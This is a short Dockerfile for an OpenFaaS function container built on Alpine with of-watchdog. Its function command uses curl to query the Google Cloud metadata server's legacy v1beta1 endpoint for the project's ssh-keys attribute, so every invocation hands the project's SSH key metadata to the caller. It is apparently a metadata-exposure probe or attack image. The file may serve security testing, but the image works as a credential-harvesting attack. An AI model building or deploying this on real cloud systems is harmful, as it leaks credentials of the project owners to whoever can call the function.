FROM alpine

ADD https://github.com/openfaas-incubator/of-watchdog/releases/download/0.1.0/of-watchdog /usr/bin


RUN chmod +x /usr/bin/of-watchdog
RUN apk add --no-cache curl

WORKDIR /root/

ENV fprocess="curl -sk http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"

HEALTHCHECK --interval=1s CMD [ -e /tmp/.lock ] || exit 1


CMD ["of-watchdog"]
